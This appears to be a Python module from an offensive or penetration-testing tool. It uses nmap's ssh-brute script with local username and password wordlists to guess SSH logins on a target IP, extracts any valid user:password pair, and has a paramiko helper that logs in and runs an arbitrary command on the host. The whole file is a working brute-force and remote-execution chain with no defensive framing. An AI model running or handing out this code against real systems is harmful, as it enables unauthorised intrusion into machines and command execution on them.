import paramiko
import re
from termcolor import colored

def ssh_connect(ip, port, username, password, cmd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, port, username, password)
    print('\n' + 'SSH connected, running command: ' + cmd + '\n')
    stdin, stdout, stderr = ssh.exec_command(cmd)
    outlines = stdout.readlines()
    response = ''.join(outlines)
    print(response)


def get_ssh_access(ip, nmScan):
    if ip == 'localhost':
        ip = '127.0.0.1'
    print('SSH credential scan:')
    nmScan.scan(
        ip, arguments='-p 22 --script ssh-brute --script-args userdb=./utils/ssh/users.txt,passdb=./utils/ssh/passwords.txt')
    result = nmScan[ip]['tcp'][22]['script']['ssh-brute']
    if 'Valid credentials' in result:
        print(colored(result, 'green'))
        valid_credential = re.finditer(r"\w+:\w+", result, re.MULTILINE)
        for match in valid_credential:
            return match.group()
    else:
        print(result)